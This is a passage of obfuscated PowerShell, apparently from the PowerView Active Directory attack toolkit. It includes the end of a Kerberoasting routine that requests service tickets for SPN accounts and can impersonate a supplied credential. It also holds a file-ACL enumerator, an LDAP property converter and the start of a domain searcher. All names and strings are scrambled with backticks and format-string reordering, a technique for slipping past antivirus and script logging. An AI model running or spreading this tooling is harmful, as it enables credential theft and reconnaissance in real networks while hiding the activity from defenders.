        ${TOMbS`T`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReD`E`Nt`ial} =   ( &("{0}{1}"-f 'GeT','-ITEM') ('vAr'+'Iab'+'lE:5R0vK')  )."va`LuE"::"EMp`TY"
    )

    BEGIN {
        ${UseR`s`eaRchEr`AR`G`UMen`TS} = @{
            'SPN' = ${tr`UE}
            ("{3}{2}{1}{0}" -f's','ie','ropert','P') = ("{1}{7}{13}{0}{8}{9}{5}{2}{10}{3}{11}{6}{12}{4}" -f 'name,di','samaccou','servi','p','palname','me,','i','n','stinguis','hedna','ce','r','nci','t')
        }
        if (${p`sBO`UNd`pa`RAme`TERS}[("{1}{0}"-f 'n','Domai')]) { ${USErse`ARCHER`Ar`GumEN`Ts}[("{2}{1}{0}"-f'n','ai','Dom')] = ${DO`M`AiN} }
        if (${pSBoUnd`p`Ar`AMeTeRs}[("{1}{2}{0}" -f'Filter','LDA','P')]) { ${us`erse`A`RChE`RARgumeNTS}[("{1}{2}{0}" -f'lter','LDA','PFi')] = ${l`dAP`FIltER} }
        if (${PSB`OU`N`D`paR`AMETerS}[("{2}{1}{0}"-f'e','rchBas','Sea')]) { ${usERseaR`C`HerArGume`NTS}[("{0}{2}{1}" -f 'Se','ase','archB')] = ${seA`Rchb`AsE} }
        if (${PSboUndp`A`RA`MeT`Ers}[("{0}{1}{2}" -f 'Serv','e','r')]) { ${U`seRSEArcH`E`RArg`UmENTs}[("{0}{1}" -f 'S','erver')] = ${sE`Rv`Er} }
        if (${psb`O`Un`DParaMETE`RS}[("{3}{2}{0}{1}"-f'cop','e','earchS','S')]) { ${USe`RSEaR`chER`AR`GuMENts}[("{0}{1}{2}" -f'Searc','hSc','ope')] = ${seARcH`s`COPe} }
        if (${PS`BoU`NDP`ArAm`eteRs}[("{3}{0}{2}{1}"-f'u','Size','ltPage','Res')]) { ${usERs`EArCHERa`RG`UmE`N`Ts}[("{2}{1}{0}"-f'eSize','tPag','Resul')] = ${R`Es`UL`TPaGE`SizE} }
        if (${p`sBOUnd`P`ArAME`TeRS}[("{2}{0}{3}{1}"-f 've','mit','Ser','rTimeLi')]) { ${us`E`RseARC`heRa`RgUme`NTs}[("{2}{0}{1}{3}"-f 've','r','Ser','TimeLimit')] = ${SERver`TiME`LiM`it} }
        if (${pSbo`UND`Pa`RaM`EterS}[("{2}{0}{1}" -f 'ton','e','Tombs')]) { ${U`SeRSeA`RC`HErarG`UMeNtS}[("{2}{1}{3}{0}"-f 'one','omb','T','st')] = ${T`O`MbSTONe} }
        if (${p`SboU`ND`pArA`mETers}[("{1}{0}{2}" -f 'red','C','ential')]) { ${user`SEaRCHEra`R`gUM`ENTS}[("{3}{1}{0}{2}"-f 'i','ent','al','Cred')] = ${c`ReD`EnTial} }

        if (${PSB`Oun`D`Par`AMETE`RS}[("{1}{0}{2}"-f'nti','Crede','al')]) {
            ${lOg`onT`OkEN} = &("{4}{2}{3}{0}{1}"-f'onatio','n','ke-User','Impers','Invo') -Credential ${cr`eD`ENt`iaL}
        }
    }

    PROCESS {
        if (${P`SB`oUnd`pAr`AMe`TErS}[("{1}{0}{2}"-f 'ent','Id','ity')]) { ${U`S`E`R`seARC`H`ErargUmeNts}[("{0}{2}{1}"-f 'Ide','ity','nt')] = ${i`DEnTITy} }
        &("{3}{2}{1}{0}" -f'er','inUs','t-Doma','Ge') @UserSearcherArguments | &("{1}{3}{0}{2}"-f '-Obje','Wher','ct','e') {${_}."s`AMAcCOun`T`Na`ME" -ne ("{0}{1}" -f 'kr','btgt')} | &("{3}{2}{0}{1}" -f 'nSPNTicke','t','omai','Get-D')
    }

    END {
        if (${l`O`goNtokeN}) {
            &("{2}{1}{3}{0}"-f'lf','t','Invoke-Rever','ToSe') -TokenHandle ${LO`GO`Nt`oKEN}
        }
    }
}


function g`eT-p`A`ThAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f'o','PSS','h','uldProcess'}, '')]
    [OutputType({"{2}{3}{0}{4}{1}" -f'iew','CL','Pow','erV','.FileA'})]
    [CmdletBinding()]
    Param(
        [Parameter(maNdaTOry = ${t`RUe}, VaLUefrOMpIpeLine = ${TR`Ue}, VALuEFrOmpIpeliNeBYPrOperTynAmE = ${tr`UE})]
        [Alias({"{0}{1}{2}" -f'FullN','am','e'})]
        [String[]]
        ${P`ATH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDE`N`T`iAL} =   (&("{2}{0}{1}" -f 't-i','TeM','gE')  ("v"+"A"+"rIaBLe:5R0vk")  )."Val`Ue"::"Em`ptY"
    )

    BEGIN {

        function cON`Ve`RT-f`i`leRiGhT {
            
            [CmdletBinding()]
            Param(
                [Int]
                ${f`SR}
            )

            ${A`c`ceSSM`Ask} = @{
                [uint32]("{1}{2}{0}"-f'0','0x800000','0') = ("{3}{2}{1}{0}" -f'd','icRea','ner','Ge')
                [uint32]("{0}{2}{1}{3}" -f'0','000','x4','0000') = ("{2}{1}{0}" -f'te','enericWri','G')
                [uint32]("{0}{1}{2}"-f'0x','2000000','0') = ("{1}{0}{2}"-f 'nericEx','Ge','ecute')
                [uint32]("{2}{1}{0}" -f'0000000','1','0x') = ("{1}{2}{0}" -f'ericAll','G','en')
                [uint32]("{0}{2}{1}" -f '0x0200','00','00') = ("{1}{3}{2}{0}"-f 'ed','Ma','llow','ximumA')
                [uint32]("{0}{1}{2}"-f '0x0','10','00000') = ("{4}{2}{1}{5}{3}{0}{6}" -f'ur','essSyste','cc','c','A','mSe','ity')
                [uint32]("{0}{2}{1}"-f'0x00','0','10000') = ("{2}{1}{0}{3}" -f 'iz','ron','Synch','e')
                [uint32]("{2}{1}{0}" -f'000','00080','0x') = ("{3}{1}{0}{2}"-f'iteOwne','r','r','W')
                [uint32]("{0}{2}{1}" -f '0','0000','x0004') = ("{0}{2}{1}" -f'Wr','AC','iteD')
                [uint32]("{1}{2}{0}{3}" -f '200','0x00','0','00') = ("{1}{0}{2}{3}" -f 'ead','R','C','ontrol')
                [uint32]("{3}{1}{2}{0}" -f '00','1','00','0x000') = ("{0}{1}" -f'De','lete')
                [uint32]("{0}{1}{2}"-f'0x00','000','100') = ("{3}{0}{1}{4}{2}" -f 'rite','Att','butes','W','ri')
                [uint32]("{1}{2}{3}{0}" -f '080','0x','00','000') = ("{3}{1}{0}{2}"-f'ut','b','es','ReadAttri')
                [uint32]("{2}{3}{0}{1}"-f '4','0','0x000','000') = ("{2}{1}{0}{3}" -f 'Ch','ete','Del','ild')
                [uint32]("{0}{2}{1}{3}"-f '0x','00','00','0020') = ("{0}{2}{4}{3}{1}" -f 'Execu','erse','te/','v','Tra')
                [uint32]("{2}{0}{3}{1}"-f'x0','0','0','000001') = ("{5}{2}{1}{0}{4}{3}{6}" -f 'eExtende','it','r','ttribute','dA','W','s')
                [uint32]("{2}{1}{0}"-f '0008','0000','0x') = ("{2}{5}{6}{0}{1}{4}{3}" -f'dExten','ded','R','es','Attribut','e','a')
                [uint32]("{1}{2}{0}" -f '000004','0x','00') = ("{5}{0}{2}{3}{4}{1}" -f'Data/AddSu','ry','bd','ir','ecto','Append')
                [uint32]("{0}{2}{1}" -f'0x0','02','00000') = ("{0}{2}{4}{1}{3}" -f'Write','/Add','Dat','File','a')
                [uint32]("{1}{2}{0}" -f '01','0x000','000') = ("{0}{6}{3}{5}{1}{4}{2}"-f'ReadData/','ct','ry','Di','o','re','List')
            }

            ${S`impl`eperm`issIONS} = @{
                [uint32]("{0}{1}"-f'0x1f0','1ff') = ("{3}{1}{2}{0}" -f 'ntrol','u','llCo','F')
                [uint32]("{0}{2}{1}" -f '0x','f','0301b') = ("{0}{1}" -f 'Mo','dify')
                [uint32]("{2}{0}{1}"-f'x0200','a9','0') = ("{2}{0}{3}{1}" -f'd','xecute','ReadAn','E')
                [uint32]("{1}{2}{0}"-f'019f','0x','02') = ("{1}{0}{3}{2}"-f 'e','R','Write','adAnd')
                [uint32]("{0}{1}"-f '0x02008','9') = ("{1}{0}" -f 'ead','R')
                [uint32]("{2}{0}{1}" -f '0','116','0x00') = ("{1}{0}"-f 'rite','W')
            }

            ${pErM`ISS`I`ONs} = @()

            
            ${pEr`m`isSIO`NS} += ${Si`MPL`ePe`RmISSi`ONS}."kE`YS" | &("{0}{2}{1}{3}"-f'F','-Obje','orEach','ct') {
                              if ((${f`sr} -band ${_}) -eq ${_}) {
                                ${S`i`mPLeP`ERm`issIONS}[${_}]
                                ${F`sR} = ${F`sr} -band (-not ${_})
                              }
                            }

            
            ${Per`mIs`SIonS} += ${acCE`Ss`MAsk}."kE`Ys" | &("{3}{2}{1}{0}" -f'ject','Ob','-','Where') { ${F`sr} -band ${_} } | &("{3}{2}{1}{0}"-f'ject','b','-O','ForEach') { ${Acc`e`sS`masK}[${_}] }
            (${PE`Rm`iSsI`oNs} | &("{1}{0}{2}" -f'here-Ob','W','ject') {${_}}) -join ','
        }

        ${cONVer`TarGUM`en`TS} = @{}
        if (${pSB`ouNDp`ARa`m`eTErS}[("{0}{1}{2}"-f'C','redent','ial')]) { ${c`onV`ERt`ARGUM`EnTS}[("{1}{0}{2}" -f 'd','Cre','ential')] = ${CrEDE`N`T`iAL} }

        ${M`AP`Pe`DcO`mPu`TErS} = @{}
    }

    PROCESS {
        ForEach (${T`A`Rg`EtpaTh} in ${pA`Th}) {
            try {
                if ((${TA`R`gEtPaTH} -Match ((("{4}{2}{0}{5}{1}{6}{3}" -f'*','LOwL','OwLOwLO.','.*','wLOwL','w','O')) -REpLaCe([cHAR]119+[cHAR]76+[cHAR]79),[cHAR]92)) -and (${psBo`UND`PARA`meteRs}[("{0}{2}{1}"-f 'Cre','tial','den')])) {
                    ${hOStC`ompUt`eR} = (&("{2}{1}{0}"-f 't','bjec','New-O') ("{2}{0}{1}" -f 'stem.U','ri','Sy')(${tARGE`T`PaTh}))."H`OSt"
                    if (-not ${mApP`e`dC`OMpu`TErs}[${hOS`TCO`Mpu`T`ER}]) {
                        
                        &("{4}{2}{3}{0}{5}{1}" -f'Con','on','d-Remot','e','Ad','necti') -ComputerName ${HO`S`Tcompu`TeR} -Credential ${cR`Ed`entI`AL}
                        ${MA`PPe`DC`ompuTe`RS}[${H`oSt`cOmP`UTER}] = ${T`Rue}
                    }
                }

                ${a`cL} = &("{0}{1}"-f'Get-Ac','l') -Path ${tar`getpA`TH}

                ${A`cL}."GETA`cCeSSr`UleS"(${Tr`Ue}, ${tr`Ue}, [System.Security.Principal.SecurityIdentifier]) | &("{2}{1}{3}{0}"-f'h-Object','orE','F','ac') {
                    ${S`Id} = ${_}."iDEn`Ti`TyRefe`R`eNCE"."VaL`Ue"
                    ${N`AMe} = &("{1}{3}{0}{2}"-f '-S','Co','ID','nvertFrom') -ObjectSID ${s`Id} @ConvertArguments

                    ${O`UT} = &("{2}{1}{3}{0}" -f't','w-','Ne','Objec') ("{1}{0}{2}"-f'c','PSObje','t')
                    ${O`UT} | &("{0}{1}{2}"-f'Ad','d-Mem','ber') ("{0}{2}{3}{1}" -f 'Note','operty','p','r') ("{1}{0}"-f 'th','Pa') ${tA`RGetp`ATh}
                    ${o`UT} | &("{1}{2}{0}" -f'-Member','A','dd') ("{0}{2}{1}"-f 'Not','ty','eproper') ("{5}{0}{1}{2}{3}{4}"-f'ileSys','t','em','Rig','hts','F') (&("{0}{4}{1}{3}{2}"-f 'C','vert','FileRight','-','on') -FSR ${_}."Fi`L`e`sy`sTEmRIgHts"."VAlUe`__")
                    ${O`UT} | &("{0}{1}{2}" -f'Add','-Memb','er') ("{1}{0}{2}"-f'propert','Note','y') ("{0}{3}{1}{2}"-f'Iden','ityRefer','ence','t') ${NA`me}
                    ${o`UT} | &("{1}{3}{2}{0}"-f 'ber','A','m','dd-Me') ("{0}{1}{2}{3}"-f'Not','e','p','roperty') ("{3}{1}{0}{2}" -f 'tity','en','SID','Id') ${S`Id}
                    ${o`UT} | &("{3}{1}{2}{0}" -f'er','d-','Memb','Ad') ("{2}{0}{1}" -f'pe','rty','Notepro') ("{3}{1}{0}{5}{2}{4}"-f 'ess','c','ontro','Ac','lType','C') ${_}."AC`C`e`SsCO`NTRolT`YPe"
                    ${o`UT}."p`S`ObjECt"."T`yp`enamES".("{2}{0}{1}" -f 'se','rt','In').Invoke(0, ("{5}{4}{2}{0}{1}{3}" -f'erView.F','ileAC','w','L','o','P'))
                    ${O`Ut}
                }
            }
            catch {
                &("{1}{0}{2}" -f 'os','Write-Verb','e') ('[G'+'et-Pat'+'h'+'Acl] '+'err'+'or'+': '+"$_")
            }
        }
    }

    END {
        
        ${maP`PedCOM`PUteRs}."K`Eys" | &("{2}{1}{3}{6}{4}{0}{5}" -f'e','t','Remove-Remo','e','n','ction','Con')
    }
}


function c`oNv`E`RT-ldaP`ProPeR`Ty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}{4}"-f'ou','ldPr','PSSh','oc','ess'}, '')]
    [OutputType({"{4}{9}{5}{2}{7}{8}{1}{0}{6}{3}" -f 'on','tomati','en','Object','System','agem','.PSCustom','t.A','u','.Man'})]
    [CmdletBinding()]
    Param(
        [Parameter(MANDaTory = ${t`Rue}, VAlUefroMPIPEline = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        ${prO`Per`TiES}
    )

    ${OB`jeCt`pRoPertI`eS} = @{}

    ${ProperT`i`Es}."PROp`ER`T`YN`AMeS" | &("{0}{3}{1}{2}"-f'F','ch-','Object','orEa') {
        if (${_} -ne ("{0}{2}{1}"-f'ad','h','spat')) {
            if ((${_} -eq ("{2}{1}{0}" -f'ectsid','j','ob')) -or (${_} -eq ("{2}{1}{0}" -f'story','i','sidh'))) {
                
                ${oBjECT`pr`opE`RTIes}[${_}] = ${p`ROPERt`i`eS}[${_}] | &("{3}{0}{1}{2}" -f'Ob','j','ect','ForEach-') { (&("{2}{0}{1}" -f'b','ject','New-O') ("{9}{5}{8}{4}{7}{6}{0}{3}{1}{2}"-f'ur','Iden','tifier','ity','cip','ri','Sec','al.','n','System.Security.P')(${_}, 0))."val`Ue" }
            }
            elseif (${_} -eq ("{1}{2}{0}"-f'uptype','g','ro')) {
                ${O`B`Je`cTPro`PErt`Ies}[${_}] = ${pROP`Er`TIEs}[${_}][0] -as ${grO`UpT`y`PEE`NuM}
            }
            elseif (${_} -eq ("{3}{1}{2}{0}" -f'type','maccou','nt','sa')) {
                ${ObJec`TPR`OP`E`RT`ieS}[${_}] = ${P`Ro`PerTIes}[${_}][0] -as ${SAmACcOu`Ntt`y`pe`E`NuM}
            }
            elseif (${_} -eq ("{2}{1}{0}"-f 'id','tgu','objec')) {
                
                ${O`BJECtprOP`Er`Ti`Es}[${_}] = (&("{0}{1}{2}"-f'N','ew','-Object') ("{0}{1}" -f'Gui','d') (,${pro`pe`Rt`iES}[${_}][0]))."Gu`Id"
            }
            elseif (${_} -eq ("{1}{0}{3}{2}{4}{5}"-f 'ser','u','ount','acc','c','ontrol')) {
                ${o`BJ`e`cTPRo`PerTiEs}[${_}] = ${prop`ERTI`eS}[${_}][0] -as ${u`ACe`NUM}
            }
            elseif (${_} -eq ("{3}{2}{1}{0}"-f'scriptor','ecurityde','s','nt')) {
                
                ${dEsc`R`IPtoR} = &("{2}{0}{1}"-f 'bje','ct','New-O') ("{2}{1}{0}{6}{9}{3}{8}{7}{5}{4}{10}"-f'c','ecurity.A','S','a','to','p','cessC','escri','wSecurityD','ontrol.R','r') -ArgumentList ${P`RoPeRt`iEs}[${_}][0], 0
                if (${DE`S`cr`Iptor}."oWn`Er") {
                    ${O`BJEC`TpRopE`RTIEs}[("{0}{1}"-f 'Owne','r')] = ${d`eSc`Ript`Or}."o`wNer"
                }
                if (${DeS`c`R`iPtoR}."g`ROup") {
                    ${oB`jEct`P`RopERtiEs}[("{1}{0}" -f 'roup','G')] = ${DE`scrIP`TOr}."grO`UP"
                }
                if (${dES`crIP`T`oR}."DISC`R`eTI`onaryA`cL") {
                    ${OB`j`ECT`PROPERTieS}[("{2}{1}{3}{0}{4}" -f 'aryA','cre','Dis','tion','cl')] = ${D`ESCRIp`TOr}."DISCrE`TiOnaR`Y`AcL"
                }
                if (${d`E`sCrIPt`oR}."s`YStEM`ACL") {
                    ${ObjEcT`PROPe`R`T`iEs}[("{1}{2}{0}{3}" -f'e','Sys','t','mAcl')] = ${DE`SCR`Ipt`oR}."sy`sT`EmacL"
                }
            }
            elseif (${_} -eq ("{2}{0}{3}{1}" -f 'counte','s','ac','xpire')) {
                if (${prO`p`erTI`eS}[${_}][0] -gt   (  &('gI') ("{2}{1}{3}{0}"-f'f6','ArIab','V','le:r4'))."Va`LUE"::"M`AXv`Alue"."T`IcKs") {
                    ${ObJeCt`prOp`e`RTiES}[${_}] = ("{1}{0}"-f'ER','NEV')
                }
                else {
                    ${oB`j`EctProPE`RtIEs}[${_}] =   ${R`4F6}::"fRom`FILe`TiMe"(${PrO`PErti`eS}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{2}{0}{1}" -f'og','on','lastl')) -or (${_} -eq ("{3}{1}{2}{0}" -f'p','logontimest','am','last')) -or (${_} -eq ("{0}{1}{2}"-f 'pwdlas','tse','t')) -or (${_} -eq ("{2}{0}{1}"-f 'astlogof','f','l')) -or (${_} -eq ("{0}{2}{3}{1}" -f 'badPas','Time','sw','ord')) ) {
                
                if (${prO`pE`R`Ties}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${te`mP} = ${pR`oPER`TieS}[${_}][0]
                    [Int32]${h`iGh} = ${T`Emp}.("{0}{1}"-f 'G','etType').Invoke().("{0}{2}{1}" -f 'Invok','r','eMembe').Invoke(("{1}{0}{2}" -f 'ghPa','Hi','rt'),  ${3q9`U`Tl}::"getpR`op`ERty", ${N`ULl}, ${T`EMP}, ${NU`lL})
                    [Int32]${l`ow}  = ${Te`mp}.("{1}{0}" -f'e','GetTyp').Invoke().("{2}{0}{1}{3}" -f 'Mem','b','Invoke','er').Invoke(("{0}{1}{2}"-f 'L','o','wPart'),    ${3`q9uTL}::"get`pr`operTY", ${n`ULl}, ${TE`mp}, ${n`Ull})
                    ${O`BjECTp`R`OPERt`ieS}[${_}] = (  ${R4`F6}::"frOMfi`lE`TIME"([Int64]("0x{0:x8}{1:x8}" -f ${hI`Gh}, ${L`OW})))
                }
                else {
                    
                    ${ob`Je`C`TP`ROPErTIES}[${_}] = ( ${R4`F6}::"fRo`mFIL`E`TiME"((${p`RO`PertIEs}[${_}][0])))
                }
            }
            elseif (${pR`o`P`eRtIeS}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${P`RoP} = ${pr`oPE`R`TiES}[${_}]
                try {
                    ${t`eMp} = ${Pr`Op}[${_}][0]
                    [Int32]${Hi`GH} = ${t`EMP}.("{1}{2}{0}" -f 'e','GetTy','p').Invoke().("{0}{2}{1}"-f 'InvokeM','er','emb').Invoke(("{1}{2}{0}" -f'rt','HighP','a'),   ${3q`9`UTl}::"gETPRO`p`er`Ty", ${n`ULL}, ${t`EMp}, ${N`ULL})
                    [Int32]${L`oW}  = ${t`Emp}.("{1}{0}" -f 'e','GetTyp').Invoke().("{1}{0}{2}" -f'eM','Invok','ember').Invoke(("{1}{0}" -f 'owPart','L'),    (&('gi')  ("{3}{1}{2}{0}"-f '3Q9Utl','Ri','Able:','VA'))."VAL`UE"::"GeTpRoPE`R`Ty", ${Nu`LL}, ${t`Emp}, ${Nu`ll})
                    ${o`BJECTP`R`op`ERTiEs}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${hi`Gh}, ${l`OW})
                }
                catch {
                    &("{0}{2}{1}{3}{4}" -f 'W','-V','rite','erbos','e') ('[Conv'+'e'+'rt-LDA'+'PPr'+'operty'+'] '+'erro'+'r'+': '+"$_")
                    ${Obj`ECtpRO`PER`TIES}[${_}] = ${pr`op}[${_}]
                }
            }
            elseif (${P`R`oP`ERTiEs}[${_}]."Co`UNT" -eq 1) {
                ${oBJ`e`CtpR`oPeRTIes}[${_}] = ${p`R`o`PErties}[${_}][0]
            }
            else {
                ${O`Bj`ECtP`ROp`ErtIeS}[${_}] = ${P`R`opErT`IeS}[${_}]
            }
        }
    }
    try {
        &("{2}{1}{0}" -f't','w-Objec','Ne') -TypeName ("{2}{0}{1}"-f'j','ect','PSOb') -Property ${O`Bjec`Tp`R`OpeRt`Ies}
    }
    catch {
        &("{3}{1}{0}{2}"-f'nin','r','g','Write-Wa') ('[C'+'onvert-LDAPPro'+'p'+'er'+'ty] '+'Er'+'ro'+'r '+'parsi'+'ng '+'L'+'DAP '+'p'+'rop'+'e'+'rties '+': '+"$_")
    }
}








function gE`T-`DOMaIns`eARCHeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}" -f'houldP','rocess','PSS'}, '')]
    [OutputType({"{4}{1}{2}{9}{11}{10}{7}{8}{6}{3}{5}{0}" -f 'r','tem.Di','re','ector','Sys','ySearche','Dir','i','ces.','ct','v','orySer'})]
    [CmdletBinding()]
    Param(
        [Parameter(valUeFRomPIPeLInE = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'er','Filt'})]
        [String]
        ${ldA`Pfi`l`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`RO`PErt`IeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'A','DS','Path'})]
        [String]
        ${SeARCH`B`ASe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SEarChb`AsePRe`F`IX},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{2}{1}" -f'D','ontroller','nC','o','mai'})]
        [String]
        ${SE`R`VeR},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{1}{0}" -f 'vel','OneLe'}, {"{1}{0}" -f 'ubtree','S'})]
        [String]
        ${Se`AR`cH`scoPE} = ("{0}{1}" -f'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEs`Ul`TpA`gEs`IZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RvEr`TImE`lIm`It} = 120,

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{1}{0}" -f'up','Gro'}, {"{0}{1}" -f'N','one'}, {"{0}{1}" -f'Owne','r'}, {"{1}{0}" -f'l','Sac'})]
        [String]
        ${secuRi`TYMA`S`ks},

        [Switch]
        ${T`om`BsTOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REden`TIAL} =   ${5`R0VK}::"Em`pTY"
    )

    PROCESS {
        if (${pSBoUnDP`A`Ra`M`ete`Rs}[("{1}{0}{2}"-f'om','D','ain')]) {
            ${targ`eTdo`m`AiN} = ${do`MaiN}

            if (${ENV`:UsErdn`sdo`mA`in} -and (${EN`V:U`SERdN`sdO`mA`IN}.("{1}{0}"-f 'im','Tr').Invoke() -ne '')) {
                
                ${uSeRDO`mA`in} = ${En`V:UsERDNsD`om`AIn}
                if (${env:lOGOn`se`RV`er} -and (${en`V:L`ogo`N`S`ERVEr}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') -and ${USErDo`m`AiN}) {
                    ${b`INDS`eRVer} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif (${psBO`Und`pAR`A`MeTe`RS}[("{0}{2}{1}"-f'Cre','ial','dent')]) {
            
            ${D`o`mAInOBJect} = &("{2}{1}{0}"-f 'Domain','t-','Ge') -Credential ${cr`EdentI`AL}
            ${BI`N`dServ`ER} = (${doMAi`NOBjE`ct}."pDCrOlE`O`Wn`eR")."n`Ame"
            ${TaRgeT`D`om`A`iN} = ${dO`maInobjE`ct}."N`Ame"
        }
        elseif (${en`V:`USerdNs`domain} -and (${E`NV`:us`ErdNSdoMa`in}.("{1}{0}"-f 'im','Tr').Invoke() -ne '')) {
            
            ${targE`T`d`O`MaiN} = ${e`Nv`:`UsERdNsDO`Main}
            if (${E`NV:`loGoNSer`Ver} -and (${En`V:loG`ON`SErvEr}.("{1}{0}" -f 'm','Tri').Invoke() -ne '') -and ${tar`get`domAIN}) {
                ${BiN`d`seRV`eR} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            
            &("{1}{2}{0}" -f'-verbose','w','rite') ("{1}{2}{0}"-f '-domain','ge','t')
            ${dOMA`inOBjE`CT} = &("{2}{0}{1}" -f 'et-Domai','n','G')
            ${b`IN`dsER`VeR} = (${dOmAIn`Ob`j`ECT}."pdCR`Ol`eown`er")."nA`Me"
            ${tArGeT`d`O`m`AIN} = ${DOmAIn`O`Bject}."NA`mE"
        }

        if (${pS`BoU`ND`PArAM`EtERs}[("{0}{1}" -f'Serv','er')]) {
            
            ${Bi`NDsErv`Er} = ${se`R`VEr}
        }

        ${Se`ARcH`sTrinG} = ("{0}{2}{1}"-f'L','AP://','D')

        if (${Bi`N`dserVEr} -and (${b`INDsErV`er}.("{0}{1}"-f 'T','rim').Invoke() -ne '')) {
            ${S`earch`S`TRinG} += ${BIN`d`S`ErVeR}
            if (${TarG`Et`Domain}) {
                ${s`EarC`hS`Tr`iNg} += '/'
            }
        }

        if (${psbOu`NDP`A`RaMe`TeRS}[("{3}{1}{0}{2}" -f'hBasePre','earc','fix','S')]) {
            ${S`eAR`CHS`T`RInG} += ${SEAR`c`HBa`sep`REF`ix} + ','
        }

        if (${ps`B`oundpA`R`AMEtErS}[("{1}{0}{2}"-f 's','SearchBa','e')]) {
            if (${seA`RChbA`Se} -Match ("{0}{2}{1}" -f'^GC','//',':')) {
                
                ${D`N} = ${seaRCH`B`A`se}.("{0}{1}" -f'ToUpp','er').Invoke().("{0}{1}"-f 'Tri','m').Invoke('/')
                ${S`EaRC`HstRIng} = ''
            }
            else {
                if (${S`E`ARCh`BasE} -match ("{1}{0}"-f'AP://','^LD')) {
                    if (${SEA`R`c`HbASe} -match ("{1}{3}{2}{0}"-f '//.+/.+','L',':','DAP')) {
                        ${sEArcH`ST`Ri`NG} = ''
                        ${DN} = ${sE`ARcH`BA`SE}
                    }
                    else {
                        ${D`N} = ${S`EARcH`Ba`sE}.("{1}{0}{2}" -f't','SubS','ring').Invoke(7)
                    }
                }
                else {
                    ${Dn} = ${Se`A`RchbaSe}
                }
            }
        }
        else {
            
            if (${TargET`do`main} -and (${targ`E`TdoM`A`iN}.("{0}{1}"-f'Tri','m').Invoke() -ne '')) {
                ${Dn} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${s`EA`RChsT`RinG} += ${D`N}
        &("{4}{0}{3}{1}{2}"-f 'ite-','os','e','Verb','Wr') ('[Get'+'-Domai'+'nSe'+'archer] '+'sea'+'rch'+' '+'ba'+'se: '+"$SearchString")

        if (${c`R`e`DENTiaL} -ne   ${5r0vK}::"e`mpTY") {
            &("{3}{1}{0}{2}" -f 'ite-Verb','r','ose','W') ("{7}{12}{9}{1}{8}{6}{10}{4}{11}{2}{5}{0}{3}" -f'P connect',' alt',' LD','ion','redentials f','A','nate ','[Get-DomainSe','er','g','c','or','archer] Usin')
            
            ${dom`AI`NObJe`Ct} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{4}{7}{1}{8}{2}{0}{6}{5}{3}" -f 'ec','to','es.Dir','ry','Dir','t','toryEn','ec','ryServic')(${s`Ea`R`CHstRIng}, ${CReDen`TI`AL}."Us`er`Name", ${cRE`d`ent`iAl}.("{2}{0}{3}{1}" -f'tworkCred','al','GetNe','enti').Invoke()."pasSW`O`Rd")
            ${seAr`c`HER} = &("{0}{1}{2}"-f'N','ew-Ob','ject') ("{12}{1}{6}{9}{5}{7}{4}{3}{11}{2}{10}{0}{8}" -f 'e','i','ySe','t','Direc','ctoryServices','r','.','r','e','arch','or','System.D')(${d`oM`AInOBject})
        }
        else {
            
            ${s`Ea`RcHeR} = &("{2}{1}{0}" -f't','Objec','New-') ("{8}{5}{9}{7}{4}{2}{6}{0}{1}{3}"-f 'ry','Se','r','archer','ces.Di','m.Di','ecto','ectoryServi','Syste','r')([ADSI]${SEAr`Ch`S`Tr`ing})
        }

        ${SEaR`cH`er}."P`Ag`eSize" = ${ResUlTp`A`ge`size}
        ${SE`ARc`heR}."Se`ArC`H`scoPE" = ${Se`ARch`ScoPE}
        ${S`eArc`HeR}."Cach`e`REsU`lTs" = ${FaL`SE}
        ${sE`Ar`cHeR}."refeRRAl`CHaS`ing" =   (  &("{2}{0}{1}"-f 'et','-ChILDITEM','g')  ("{1}{2}{0}" -f'Y','V','ariAblE:j40') )."VaL`Ue"::"A`Ll"

        if (${PsbouNdpaR`A`Met`erS}[("{0}{2}{1}{3}" -f'Server','m','TimeLi','it')]) {
            ${s`e`ArChEr}."sE`RvEr`Tim`eLimit" = ${SEr`VERtIme`L`ImIT}
        }

        if (${P`s`BoUNDParaME`T`erS}[("{1}{2}{0}" -f'ne','Tomb','sto')]) {
            ${SEar`C`heR}."tO`mBstOnE" = ${tR`Ue}
        }

        if (${pSB`OUndPA`R`AMeteRs}[("{0}{1}{2}" -f'LDAPF','ilte','r')]) {
            ${SE`AR`CheR}."f`iLteR" = ${ldap`F`iLT`ER}
        }

        if (${PsbOUn`D`PaR`AmeT`ERs}[("{0}{2}{1}{3}" -f 'Secu','ity','r','Masks')]) {
            ${Se`A`RChEr}."Se`cURI`TyM`AskS" = Switch (${sE`curItYm`ASKs}) {
                ("{1}{0}" -f'l','Dac') {  (  &('gI')  ('v'+'ARI'+'abLE'+':59j8'+'hU')  )."val`Ue"::"Da`cL" }
